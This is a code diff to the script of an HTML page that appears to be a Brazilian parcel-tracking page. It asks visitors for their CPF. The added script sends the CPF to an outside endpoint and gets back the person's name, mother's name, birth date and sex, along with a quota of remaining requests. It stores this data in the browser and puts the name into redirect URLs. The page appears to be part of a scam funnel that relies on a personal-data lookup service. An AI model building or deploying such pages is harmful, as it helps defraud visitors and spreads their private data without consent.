@@ -1073,254 +1073,83 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
 
 
 <script>
-(function () {
-  "use strict";
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form.e_formulario");
+            const inputCPF = document.getElementById("input_1734416045");
+            const btnConsultar = form.querySelector("button");
+            const errorDiv = form.querySelector(".gpc_campos-erro");
+            const textoErrorDiv = document.querySelector(".textoerror");
 
-  function initCPFForm() {
-    const form = document.getElementById("tracking-form");
-    const inputCPF = document.getElementById("tracking-code");
-    const errorElement = document.getElementById("tracking-error");
+            inputCPF.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\D/g, "");
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+                e.target.value = value;
+            });
 
-    if (!form || !inputCPF || !errorElement) return;
+            const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;
 
-    // Evita inicializar o formulário duas vezes.
-    if (form.dataset.cpfInitialized === "true") return;
-    form.dataset.cpfInitialized = "true";
+            btnConsultar.addEventListener("click", async (e) => {
+                e.preventDefault();
 
-    const API_URL =
-      "https://site-clientes.online/aknes-api/aknes.php";
+                const cpf = inputCPF.value.replace(/\D/g, "");
 
-    const NEXT_URL = "../rastreio/index.html";
+                errorDiv.classList.remove("active");
+                textoErrorDiv.classList.remove("active");
+                inputCPF.classList.remove("active");
 
-    let isSubmitting = false;
+                if (!isValidCPF(cpf)) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = "CPF precisa ter 11 dígitos!";
+                    return;
+                }
 
-    function onlyDigits(value) {
-      return value.replace(/\D/g, "").slice(0, 11);
-    }
+                try {
+                    const url = `https://site-clientes.online/aknes-api/aknes.php?cpf=${cpf}`;
+                    const response = await fetch(url);
 
-    // Formata o CPF: 000.000.000-00
-    function formatCPF(digits) {
-      digits = digits.slice(0, 11);
+                    if (!response.ok) {
+                        throw new Error("Erro ao consultar a API");
+                    }
 
-      if (digits.length > 9) {
-        return digits.replace(
-          /^(\d{3})(\d{3})(\d{3})(\d{1,2})$/,
-          "$1.$2.$3-$4"
-        );
-      }
+                    const data = await response.json();
 
-      if (digits.length > 6) {
-        return digits.replace(
-          /^(\d{3})(\d{3})(\d+)$/,
-          "$1.$2.$3"
-        );
-      }
+                    if (data.status === 200) {
+                        const hoje = new Date();
+                        const dia = String(hoje.getDate()).padStart(2, '0');
+                        const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+                        const ano = hoje.getFullYear();
+                        const dataFormatada = `${dia}/${mes}/${ano}`;
 
-      if (digits.length > 3) {
-        return digits.replace(
-          /^(\d{3})(\d+)$/,
-          "$1.$2"
-        );
-      }
+                        localStorage.setItem("nome", data.nome);
+                        localStorage.setItem("cpf", cpf);
+                        localStorage.setItem("data_atual", dataFormatada);
+                        localStorage.setItem("mae", data.mae);
+                        localStorage.setItem("nascimento", data.nascimento);
+                        localStorage.setItem("sexo", data.sexo);
+                        localStorage.setItem("requisicoes_restantes", data.requisicoes_restantes);
 
-      return digits;
-    }
+                        const currentParams = new URLSearchParams(window.location.search);
+                        currentParams.set("nome", encodeURIComponent(data.nome));
+                        currentParams.set("cpf", encodeURIComponent(cpf));
+                        currentParams.set("data_atual", dataFormatada);
 
-    // Valida os dígitos verificadores do CPF.
-    function isValidCPF(value) {
-      const cpf = onlyDigits(value);
-
-      if (cpf.length !== 11) return false;
-      if (/^(\d)\1{10}$/.test(cpf)) return false;
-
-      const digits = cpf.split("").map(Number);
-      let sum = 0;
-
-      for (let i = 0; i < 9; i++) {
-        sum += digits[i] * (10 - i);
-      }
-
-      let remainder = (sum * 10) % 11;
-      if (remainder === 10) remainder = 0;
-
-      if (remainder !== digits[9]) return false;
-
-      sum = 0;
-
-      for (let i = 0; i < 10; i++) {
-        sum += digits[i] * (11 - i);
-      }
-
-      remainder = (sum * 10) % 11;
-      if (remainder === 10) remainder = 0;
-
-      return remainder === digits[10];
-    }
-
-    // Centraliza a mensagem na largura total disponível.
-    function showError(message) {
-      errorElement.textContent = message;
-      errorElement.hidden = false;
-
-      errorElement.style.setProperty("display", "block", "important");
-      errorElement.style.setProperty("width", "100%", "important");
-      errorElement.style.setProperty("max-width", "100%", "important");
-      errorElement.style.setProperty("text-align", "center", "important");
-      errorElement.style.setProperty("font-size", "1.1em", "important");
-      errorElement.style.setProperty("font-weight", "bold", "important");
-      errorElement.style.setProperty("margin-left", "auto", "important");
-      errorElement.style.setProperty("margin-right", "auto", "important");
-      errorElement.style.setProperty("box-sizing", "border-box", "important");
-
-      errorElement.setAttribute("role", "alert");
-      inputCPF.setAttribute("aria-invalid", "true");
-    }
-
-    function clearError() {
-      errorElement.textContent = "";
-      errorElement.hidden = true;
-
-      [
-        "display",
-        "width",
-        "max-width",
-        "text-align",
-        "font-size",
-        "font-weight",
-        "margin-left",
-        "margin-right",
-        "box-sizing"
-      ].forEach(function (property) {
-        errorElement.style.removeProperty(property);
-      });
-
-      inputCPF.removeAttribute("aria-invalid");
-    }
-
-    // Máscara automática mantendo a posição do cursor.
-    inputCPF.addEventListener("input", function () {
-      const oldValue = inputCPF.value;
-      const oldCursor = inputCPF.selectionStart;
-
-      const digitsBeforeCursor = oldValue
-        .slice(0, oldCursor === null ? oldValue.length : oldCursor)
-        .replace(/\D/g, "").length;
-
-      const digits = onlyDigits(oldValue);
-      const formatted = formatCPF(digits);
-
-      inputCPF.value = formatted;
-
-      let newCursor = 0;
-      let digitCount = 0;
-
-      while (
-        newCursor < formatted.length &&
-        digitCount < digitsBeforeCursor
-      ) {
-        if (/\d/.test(formatted[newCursor])) {
-          digitCount++;
-        }
-
-        newCursor++;
-      }
-
-      try {
-        inputCPF.setSelectionRange(newCursor, newCursor);
-      } catch (_) {}
-
-      clearError();
-    });
-
-    // Consulta o CPF ao enviar o formulário.
-    form.addEventListener("submit", async function (event) {
-      event.preventDefault();
-
-      if (isSubmitting) return;
-
-      clearError();
-
-      const cpf = onlyDigits(inputCPF.value);
-
-      if (!isValidCPF(cpf)) {
-        showError("Digite um CPF válido, com 11 dígitos.");
-        inputCPF.focus();
-        return;
-      }
-
-      isSubmitting = true;
-
-      const buttons = form.querySelectorAll('button[type="submit"]');
-
-      buttons.forEach(function (button) {
-        button.disabled = true;
-      });
-
-      try {
-        const apiURL = new URL(API_URL);
-        apiURL.searchParams.set("cpf", cpf);
-
-        const response = await fetch(apiURL.toString(), {
-          method: "GET",
-          headers: {
-            "Accept": "application/json"
-          }
+                        window.location.href = `../rastreio/index.html?${currentParams.toString()}`;
+                    } else {
+                        throw new Error("CPF não encontrado. Tente novamente.");
+                    }
+                } catch (error) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = error.message;
+                }
+            });
         });
-
-        if (!response.ok) {
-          throw new Error(
-            "Não foi possível consultar o CPF. Tente novamente."
-          );
-        }
-
-        const data = await response.json();
-
-        if (!data || Number(data.status) !== 200) {
-          throw new Error(
-            "CPF não encontrado. Verifique os números e tente novamente."
-          );
-        }
-
-        // Preserva os parâmetros atuais, incluindo as UTMs.
-        const currentParams = new URLSearchParams(
-          window.location.search
-        );
-
-        currentParams.set("cpf", cpf);
-
-        const queryString = currentParams.toString();
-
-        const destination = queryString
-          ? NEXT_URL + "?" + queryString
-          : NEXT_URL;
-
-        window.location.href = destination;
-
-      } catch (error) {
-        showError(
-          error instanceof TypeError
-            ? "Erro de conexão ao consultar o CPF. Tente novamente."
-            : error.message || "Ocorreu um erro. Tente novamente."
-        );
-
-        isSubmitting = false;
-
-        buttons.forEach(function (button) {
-          button.disabled = false;
-        });
-      }
-    });
-  }
-
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", initCPFForm, {
-      once: true
-    });
-  } else {
-    initCPFForm();
-  }
-})();
-</script>
+    </script>
 
 
       <h4 class="services-note">Atenção: Digite seu CPF <br> sem pontos e traços (apenas números)</h4>
